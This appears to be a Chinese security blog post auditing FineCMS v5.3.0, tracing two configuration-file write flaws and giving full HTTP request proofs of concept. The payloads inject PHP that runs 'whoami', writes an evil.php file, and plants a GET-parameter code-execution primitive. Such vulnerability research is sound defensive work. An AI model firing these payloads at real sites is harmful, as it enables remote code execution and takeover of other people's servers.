## 0x00 背景

最近在挖掘FineCMS源码的漏洞，发现了一些有趣的洞，斗哥计划先从配置文件写入开始分析，然后再结合存储XSS进行GetShell，本篇先分析配置文件写入的问题，下周再分析存储XSS的问题，最终通过这两类洞的组合利用GetShell，大体思路流程很简单，但是代码分析中有蛮多技巧，期待与师傅们的交流讨论。

## 0x01 漏洞审计

### 1x00 相关环境

源码信息：FineCMS v5.3.0 bulid 20180206

问题文件： \finecms\finecms\system\core\Input.php

漏洞类型：配置文件写入问题

站点地址：<http://www.finecms.net/>

### 1x01 漏洞分析

在\finecms\finecms\dayrui\controllers\Install.php文件中的第127-131行发现如下代码块。

![代码块 1.png](https://image.3001.net/images/20180307/15203917514913.png!small)

![代码块2.png](https://image.3001.net/images/20180307/15203917687114.png!small)

通过反向追溯在当前文件中的第75行中发现$data的创建位置。

![位置.png](https://image.3001.net/images/20180307/15203917861584.png!small)

跟入post方法,在\finecms\finecms\system\core\Input.php文件中的第255行中发现发 post方法的代码块。

![post.png](https://image.3001.net/images/20180307/15203918453835.png!small)

跟入_fetch_from_array方法，在\finecms\finecms\system\core\Input.php文件中的第177-230行中发现该方法的代码块，代码主要对传入的数组进行简单的数据判断，代码较多这里列出重要的代码，当$xss_clean为TRUE的时候会进行xss_clean操作。通过追溯$xss_clean变量，发现是从\finecms\finecms\dayrui\config\config.php配置文件中的$config['global_xss_filtering']获取的，但是默认情况下该变量的值为FALSE，不会进行任何的XSS过滤。

![xss.png](https://image.3001.net/images/20180307/15203921386013.png!small)

但是当$config['global_xss_filtering']为TRUE会进入\finecms\finecms\system\core\Security.php的xss_clean方法进行XSS过滤，但是不进行单引号的转义，但是还过滤了PHP的标签和一些关键函数，由于还过滤了尖括号所以标签没想到绕过方法，但是可以使用类似system/()/('whoami')的方式绕过关键字的过滤规则进行代码执行。

![zhixing
1.png](https://image.3001.net/images/20180307/15203921701595.png!small)

![zhixing
2.png](https://image.3001.net/images/20180307/15203921875848.png!small)

因此此处可以引入单引号，从而导致写入php代码进行GetShell。

### 1x02 漏洞复现

在进行安装的时候，如果$config['global_xss_filtering']开启了,即TRUE，可构造如下请求可以执行PHP代码导致GetShell

    
    
    POST /index.php?c=install&m=index&step=3 HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: application/json, text/javascript, */*; q=0.01
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    
    X-Requested-With: XMLHttpRequest
    
    Referer: [http://127.0.0.1/index.php?c=install&m=index&step=3](http://127.0.0.1/index.php?c=install&m=index&step=3)
    
    Content-Length: 172
    
    Connection: close
    
    data%5Bdbhost%5D=127.0.0.1&data%5Bdbuser%5D=root&data%5Bdbpw%5D=root&data%5Bdbname%5D=FineCMS&data%5Bdbprefix%5D=fn_').die(system/*()*/('whoami'));array(//&data%5Bdemo%5D=1
    

如果$config['global_xss_filtering']未开启即为FALSE，进行如下请求可以GetShell。

    
    
    POST /index.php?c=install&m=index&step=3 HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: application/json, text/javascript, */*; q=0.01
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    
    X-Requested-With: XMLHttpRequest
    
    Referer: [http://127.0.0.1/index.php?c=install&m=index&step=3](http://127.0.0.1/index.php?c=install&m=index&step=3)
    
    Content-Length: 195
    
    Connection: close
    
    data%5Bdbhost%5D=127.0.0.1&data%5Bdbuser%5D=root&data%5Bdbpw%5D=root&data%5Bdbname%5D=FineCMS&data%5Bdbprefix%5D=fn_'.die(fwrite(fopen('evil.php', 'w'), '<?php phpinfo();?>')),//&data%5Bdemo%5D=1
    

成功写入文件并生成evil.php：

![PHP 1.png](https://image.3001.net/images/20180307/1520392765183.png!small)

![php  2.png](https://image.3001.net/images/20180307/15203927813225.png!small)

访问evil.php成功GetShell：

![shell.png](https://image.3001.net/images/20180307/15203928259713.png!small)

### 2x00 相关环境

源码信息：FineCMS v5.3.0 bulid 20180206

问题文件： \finecms\finecms\dayrui\libraries\Dconfig.php

漏洞类型：配置文件写入问题

站点地址：<http://www.finecms.net/>

### 2x01 漏洞分析

在文件\finecms\finecms\dayrui\controllers\admin\Site.php的第46-67行中发现如下代码块，使用post接收data的数据，然后在检测域名是否被使用，未被使用将更新数据库中fn_site表中的domain的字段。

![字段 1.png](https://image.3001.net/images/20180307/15203930424156.png!small)

![字段 2.png](https://image.3001.net/images/20180307/15203930862316.png!small)

跟入$this->site_model->cache(),在\finecms\finecms\dayrui\models\Site_model.php文件中的第323-368行中，发现cache()方法，重点看第325行和338行。

![338.png](https://image.3001.net/images/20180307/15203931893995.png!small)

跟入$this->get_site_data()方法,在\finecms\finecms\dayrui\models\Site_model.php文件中的第285-300行发现代码块，分析代码块知道是进行如下的数据查询，把前面存到数据库中的配置，取出来然后赋给$data,
通过打印$data可以知道到的就是站点配置的信息。

![信息 1.png](https://image.3001.net/images/20180307/1520393279372.png!small)

![信息 2.png](https://image.3001.net/images/20180307/15203932931153.png!small)

跟进$t['domain'] && $domain[$t['domain']] =
$id;,$domain最终传入了如下\finecms\finecms\dayrui\models\Site_model.php文件中的第363行代码。

![363.png](https://image.3001.net/images/20180307/15203933307909.png!small)

因此foreach ($data as $id => $t)后对$domain[$t['domain']] =
$id;进行赋值，其中为$domain变量传入了键名$t['domain'],又因为to_require_one中不会对数组的键名进行安全处理，因此可以引入单引号，存在文件写入的问题。

### 2x02 漏洞复现

可以通过构造如下请求进行文件写入，并执行代码的操作：

    
    
    POST /admin.php?c=site&m=index&func=assert&evil=system('whoami') HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: application/json, text/javascript, /; q=0.01
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    
    X-Requested-With: XMLHttpRequest
    
    Referer: [http://127.0.0.1/admin.php?c=site&m=index](http://127.0.0.1/admin.php?c=site&m=index)
    
    Content-Length: 95
    
    Cookie: member_uid=1; member_cookie=398ecbf6b4b29dd1a5d0; 8b0cba072045805256806b2b24239ded_ci_session=09t3nk6i1l5bfevngel2clvbuf1504p8
    
    Connection: close
    
    ids[]=1&data[1][name]=FineCMS&data[1][domain]=127.0.0.1'=>1).die($_GET['func']($_GET['evil'])//
    

![斜杠.png](https://image.3001.net/images/20180307/15203934182137.png!small)  

## 0x03 小结

本篇仅列举了两处这类问题，其实该源码还有其他处文件写入问题，大家也可以自行审计去发现。留下个小疑问，这些后台的洞大家有啥办法从前台去利用呢？
有想法的可以私我thinking_balabala@163.com，下周我将给出我的方法，期待一起交流。

